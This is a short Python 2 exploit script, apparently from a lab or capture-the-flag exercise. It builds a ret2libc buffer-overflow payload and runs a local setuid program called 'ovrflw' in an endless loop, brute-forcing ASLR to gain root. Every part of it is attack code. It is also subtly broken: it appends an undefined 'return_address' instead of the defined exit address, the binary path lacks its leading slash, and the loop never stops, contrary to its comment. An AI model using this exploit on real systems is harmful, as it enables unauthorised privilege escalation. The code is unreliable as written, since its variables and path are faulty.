# Bypass N^X (not executable stack) with a ret2libc attack and use bruteforce to bypass ASLR, the overflow attack allows privilege escalation to root
# The loop stops when the address is successfully bruteforced, it may take hundreds of attempts
import subprocess
import struct  

system_address = struct.pack("<I", 0xb7628310)
exit_address = struct.pack("<I", 0xaabbccdd)
string_address = struct.pack("<I", 0xb774abac)

# construct the payload:
buffer = "A" * 112
buffer += system_address
buffer += return_address
buffer += string_address

tries = 0
# start an infinite loop to bruteforce the addresses:
while True:
    tries += 1
    # print the current amount of tries every 10 attempts
    if tries % 10 == 0:
        print "Attempts made: " + str(tries)
    # call the vulnerable program with the payload as its command line argument
    subprocess.call(["usr/local/bin/ovrflw", buffer])
